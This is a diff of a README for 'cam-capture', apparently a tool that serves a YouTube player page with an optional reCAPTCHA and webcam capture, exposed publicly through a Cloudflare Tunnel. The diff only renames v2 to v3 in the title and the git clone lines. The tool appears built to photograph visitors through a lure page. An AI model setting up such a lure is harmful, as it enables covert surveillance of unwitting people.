@@ -1,4 +1,4 @@
-# cam-capture-v2
+# cam-capture-v3
 
 Secure YouTube Player with optional reCAPTCHA and webcam capture.  
 Automatically starts a **Cloudflare Tunnel** for public access. Works on **Termux (Android), Linux, and Windows**.
@@ -92,8 +92,8 @@ sudo apt update && sudo apt upgrade -y
 sudo apt install python3 python3-pip git -y
 
 # Clone repository
-git clone https://github.com/Jabed-A1/cam-capture-v2.git
-cd cam-capture-v2
+git clone https://github.com/Jabed-A1/cam-capture-v3.git
+cd cam-capture-v3
 
 # Install dependencies
 pip3 install flask
@@ -105,6 +105,7 @@ sudo dpkg -i cloudflared-linux-amd64.deb
 # Run launcher
 python3 launcher.py
 ```
+
 
 
 
